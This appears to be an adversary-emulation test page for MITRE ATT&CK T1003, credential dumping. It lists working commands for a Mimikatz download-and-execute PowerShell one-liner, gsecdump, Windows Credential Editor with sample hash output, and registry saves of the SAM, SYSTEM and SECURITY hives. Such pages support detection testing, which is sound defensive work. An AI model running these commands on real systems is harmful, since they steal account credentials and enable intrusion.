# Credential Dumping

MITRE ATT&CK Technique: [T1003](https://attack.mitre.org/wiki/Technique/T1003)


## Powershell Mimikatz

Input:

    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

## Gsecdump

[Gsecdump](https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5)

Input:

    gsecdump -a

## Windows Credential Editor

[Windows Credential Editor](http://www.ampliasecurity.com/research/windows-credentials-editor/)

Input:

    wce -o output.txt

Output:

    C:\>wce -o output.txt
    WCE v1.2 (Windows Credentials Editor) - (c) 2010,2011 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
    Use -h for help.

    C:\>type output.txt
    test:AMPLIALABS:01020304050607080900010203040506:98971234567865019812734576890102
    C:\>

## Registry 

Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys:

Input:
    
    reg save HKLM\sam sam 
    reg save HKLM\system system
    reg save HKLM\security security
  
Output:

    C:\>reg save HKLM\sam sam
    The operation completed successfully.

These can be processed locally using [creddump7](https://github.com/Neohapsis/creddump7)
